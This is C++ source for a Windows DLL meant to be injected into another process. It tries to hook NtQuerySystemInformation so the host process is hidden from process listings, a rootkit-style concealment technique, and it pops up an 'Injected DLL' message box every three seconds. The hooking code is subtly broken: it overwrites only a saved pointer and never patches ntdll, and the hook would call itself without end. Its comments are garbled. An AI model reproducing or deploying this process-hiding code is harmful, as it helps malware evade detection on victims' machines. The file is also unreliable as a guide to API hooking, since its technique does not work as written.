#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <iostream>

using namespace std;

// ����NtQuerySystemInformation�����ĺ���ָ������
typedef NTSTATUS(WINAPI* pfnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

pfnNtQuerySystemInformation originalNtQuerySystemInformation = nullptr;

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = originalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
    {
        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION previous = nullptr;
        DWORD currentProcessId = GetCurrentProcessId();

        while (current->NextEntryOffset != 0)
        {
            if ((DWORD_PTR)current->UniqueProcessId == currentProcessId)
            {
                if (previous)
                {
                    previous->NextEntryOffset += current->NextEntryOffset;
                }
                else
                {
                    PBYTE nextEntry = (PBYTE)current + current->NextEntryOffset;
                    memcpy(current, nextEntry, SystemInformationLength - ((ULONG_PTR)nextEntry - (ULONG_PTR)SystemInformation));
                }
                break;
            }
            previous = current;
            current = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)current + current->NextEntryOffset);
        }
    }

    return status;
}

void InstallHook()
{
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == nullptr)
    {
        std::cout << "[ERROR] Failed to get handle to ntdll.dll." << std::endl;
        return;
    }

    originalNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (originalNtQuerySystemInformation == nullptr)
    {
        std::cout << "[ERROR] Failed to get address of NtQuerySystemInformation." << std::endl;
        return;
    }

    DWORD oldProtect;
    if (!VirtualProtect(originalNtQuerySystemInformation, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        std::cout << "[ERROR] Failed to change memory protection." << std::endl;
        return;
    }

    *(PVOID*)&originalNtQuerySystemInformation = HookedNtQuerySystemInformation;

    VirtualProtect(originalNtQuerySystemInformation, sizeof(PVOID), oldProtect, &oldProtect);
    std::cout << "[DEBUG] Hook installed successfully." << std::endl;
}

// �̺߳�������װ���Ӳ�ÿ���봴��һ������
DWORD WINAPI ThreadProc(LPVOID lpParameter)
{
    InstallHook();

    while (true)
    {
        // ����һ���򵥵���Ϣ�򴰿�
        MessageBox(NULL, L"This is a message box", L"Injected DLL", MB_OK);

        // ÿ���봴��һ������
        Sleep(3000);
    }

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);  // ���� DLL �߳̿����

        // ����һ�����̣߳���Ŀ����������� ThreadProc
        CreateThread(nullptr, 0, ThreadProc, nullptr, 0, nullptr);
    }
    return TRUE;
}
